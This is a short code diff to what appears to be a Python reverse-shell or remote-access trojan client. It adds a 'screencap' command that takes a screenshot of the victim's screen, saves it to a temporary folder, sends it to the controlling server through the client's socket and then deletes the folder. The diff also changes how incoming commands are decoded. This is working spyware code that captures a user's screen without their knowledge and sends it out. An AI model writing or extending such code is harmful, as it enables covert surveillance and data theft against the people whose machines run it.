@@ -88,7 +88,7 @@ def conn(mysocket):
         # print("[+] Connected to server")
 
         while True:
-            cmd = mysocket.recv(1024).decode(errors='ignore').strip()
+            cmd = mysocket.recv(1024).decode()
             if not cmd:
                 continue
 
@@ -118,6 +118,16 @@ def conn(mysocket):
                 except Exception as e:
                     informToServer = "[-] Some Error Occured." + str(e)
                     mysocket.send(informToServer.encode())
+
+            elif 'screencap' in cmd:
+                # Create a temp dir to store our screenshot file
+                # Sample Dirpath: C:\users\user\appdata\local\temp\tmp8dfj57ox
+                dirpath = tempfile.mkdtemp()
+                # grab() method takes a screenshot of the screen
+                # save() method saves the snapshot in the temp dir
+                ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
+                transfer(mysocket, dirpath + "\img.jpg")  # transfer to the server using our transfer function
+                shutil.rmtree(dirpath)  # delete the temp directory using shutil remove tree
 
 
             else:
